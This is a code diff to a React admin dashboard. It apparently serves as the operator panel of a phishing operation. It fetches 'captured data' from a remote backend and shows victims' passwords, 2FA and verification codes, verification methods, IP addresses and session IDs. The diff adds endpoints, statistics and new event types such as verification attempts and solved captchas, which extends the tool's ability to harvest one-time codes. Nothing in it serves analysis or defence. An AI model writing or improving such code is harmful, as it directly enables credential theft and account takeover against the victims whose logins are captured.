@@ -18,7 +18,7 @@ const AdminDashboard = () => {
     if (adminPassword === CORRECT_PASSWORD) {
       setIsAuthenticated(true);
       setAuthError('');
-      fetchData(); // Load data after successful login
+      fetchData();
     } else {
       setAuthError('Invalid admin password');
     }
@@ -28,7 +28,8 @@ const AdminDashboard = () => {
     if (!isAuthenticated) return;
     
     try {
-      const response = await fetch('https://nuns.onrender.com/admin', {
+      // FIXED: Use correct endpoint
+      const response = await fetch('https://nuns.onrender.com/api/admin/data', {
         headers: {
           'Authorization': `Bearer ${CORRECT_PASSWORD}`
         }
@@ -43,11 +44,22 @@ const AdminDashboard = () => {
       const result = await response.json();
       
       if (result.success) {
-        setCapturedData(result.data);
-        setStats(result.stats);
+        setCapturedData(result.data || []);
+        
+        // Now fetch stats
+        const statsResponse = await fetch('https://nuns.onrender.com/api/admin/stats', {
+          headers: {
+            'Authorization': `Bearer ${CORRECT_PASSWORD}`
+          }
+        });
+        
+        if (statsResponse.ok) {
+          const statsResult = await statsResponse.json();
+          setStats(statsResult.stats || {});
+        }
       }
     } catch (error) {
-      console.log('⚠️ Backend not available or authentication failed');
+      console.log('⚠️ Backend not available or authentication failed:', error);
     } finally {
       setLoading(false);
     }
@@ -61,8 +73,12 @@ const AdminDashboard = () => {
   }, [isAuthenticated, autoRefresh]);
 
   const clearData = async () => {
+    if (!window.confirm('Are you sure you want to clear all captured data?')) {
+      return;
+    }
+    
     try {
-      const response = await fetch('https://nuns-production.up.railway.app/api/admin/clear', {
+      const response = await fetch('https://nuns.onrender.com/api/admin/clear', {
         method: 'DELETE',
         headers: {
           'Authorization': `Bearer ${CORRECT_PASSWORD}`
@@ -78,18 +94,23 @@ const AdminDashboard = () => {
       
       if (result.success) {
         setCapturedData([]);
+        setStats({});
         alert(`Cleared ${result.clearedCount} items`);
         fetchData();
       }
     } catch (error) {
       console.log('Clear data error:', error);
+      alert('Failed to clear data');
     }
   };
 
   const getTypeColor = (type) => {
     switch(type) {
       case 'LOGIN_ATTEMPT': return '#ff6b6b';
-      case '2FA_ATTEMPT': return '#ffa726';
+      case 'LOGIN_FAILED': return '#ff6b6b';
+      case 'VERIFICATION_ATTEMPT': return '#ffa726';
+      case 'VERIFICATION_METHOD_SELECTED': return '#ffa726';
+      case 'CAPTCHA_SOLVED': return '#4caf50';
       case 'LOGIN_SUCCESS': return '#4caf50';
       default: return '#78909c';
     }
@@ -181,7 +202,7 @@ const AdminDashboard = () => {
           <div className="stat-icon">📊</div>
           <div className="stat-content">
             <h3>Total Captured</h3>
-            <div className="stat-number">{stats.totalCaptured || 0}</div>
+            <div className="stat-number">{stats.totalCaptured || capturedData.length || 0}</div>
           </div>
         </div>
         
@@ -197,7 +218,7 @@ const AdminDashboard = () => {
           <div className="stat-icon">🔢</div>
           <div className="stat-content">
             <h3>2FA Attempts</h3>
-            <div className="stat-number">{stats.twoFAAttempts || 0}</div>
+            <div className="stat-number">{stats.twoFAAttempts || stats.verificationAttempts || 0}</div>
           </div>
         </div>
         
@@ -212,15 +233,15 @@ const AdminDashboard = () => {
         <div className="stat-card">
           <div className="stat-icon">🌐</div>
           <div className="stat-content">
-            <h3>Unique IPs</h3>
-            <div className="stat-number">{stats.uniqueIPs || 0}</div>
+            <h3>Unique Users</h3>
+            <div className="stat-number">{stats.uniqueUsers || 0}</div>
           </div>
         </div>
       </div>
 
       {/* Captured Data Table */}
       <div className="captured-data-section">
-        <h2>📋 Live Captured Data</h2>
+        <h2>📋 Live Captured Data ({capturedData.length} records)</h2>
         
         {capturedData.length === 0 ? (
           <div className="no-data">
@@ -247,13 +268,16 @@ const AdminDashboard = () => {
                     <p><strong>🔑 Password:</strong> <span className="sensitive-data">{item.password}</span></p>
                   )}
                   {item.code && (
-                    <p><strong>🔢 2FA Code:</strong> <span className="sensitive-data">{item.code}</span></p>
+                    <p><strong>🔢 Verification Code:</strong> <span className="sensitive-data">{item.code}</span></p>
+                  )}
+                  {item.method && (
+                    <p><strong>📱 Method:</strong> {item.method}</p>
                   )}
                   {item.ip && (
                     <p><strong>🌐 IP Address:</strong> {item.ip}</p>
                   )}
                   {item.sessionId && (
-                    <p><strong>🆔 Session:</strong> <code>{item.sessionId.substring(0, 8)}...</code></p>
+                    <p><strong>🆔 Session:</strong> <code>{item.sessionId.substring(0, 12)}...</code></p>
                   )}
                 </div>
               </div>
